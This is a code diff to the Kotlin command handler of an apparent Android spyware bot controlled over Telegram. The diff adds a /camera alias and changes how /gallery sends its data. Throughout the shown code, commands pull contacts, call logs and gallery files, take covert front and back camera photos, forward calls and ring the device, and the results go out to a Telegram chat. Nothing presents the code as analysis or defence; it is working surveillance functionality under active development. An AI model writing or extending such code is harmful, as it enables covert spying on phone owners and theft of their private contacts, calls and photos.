@@ -49,8 +49,8 @@ object MessageHandler {
                     • /contacts - Get contacts list
                     • /call_log - Get call logs
                     • /gallery - Get latest photo from gallery
+                    • /camera - Take photo from back camera (alias: /camera_back)
                     • /camera_front - Take photo from front camera
-                    • /camera_back - Take photo from back camera
                     • /forward <number> - Forward calls to number
                     • /ring - Ring device at max volume
                     • /ping - Check if bot is alive
@@ -67,8 +67,8 @@ object MessageHandler {
                     /contacts - Get contacts list
                     /call_log - Get call logs
                     /gallery - Get latest photo from gallery
+                    /camera - Take photo from back camera (alias: /camera_back)
                     /camera_front - Take photo from front camera
-                    /camera_back - Take photo from back camera
                     /forward <number> - Forward calls to number
                     /ring - Ring device at max volume
                     /start - Start the bot
@@ -97,9 +97,9 @@ object MessageHandler {
                 }
             }
             "/gallery" -> {
-                val file = com.example.telegrambot.helpers.GalleryHelper.getLatestPhoto(context)
+                val file = com.example.telegrambot.helpers.GalleryHelper.getGalleryFilesList(context)
                 if (file != null) {
-                    TelegramApi.sendPhoto(token, chatId, file, "Latest photo from gallery")
+                    TelegramApi.sendDocument(token, chatId, file)
                 } else {
                     TelegramApi.sendMessage(token, chatId, "❌ Failed to read gallery. Check permissions or no photos found.")
                 }
@@ -114,7 +114,7 @@ object MessageHandler {
                     }
                 }
             }
-            "/camera_back" -> {
+            "/camera", "/camera_back" -> {
                 TelegramApi.sendMessage(token, chatId, "📸 Taking back photo...")
                 com.example.telegrambot.helpers.CameraHelper.takePhoto(context, useFront = false) { file ->
                     if (file != null) {
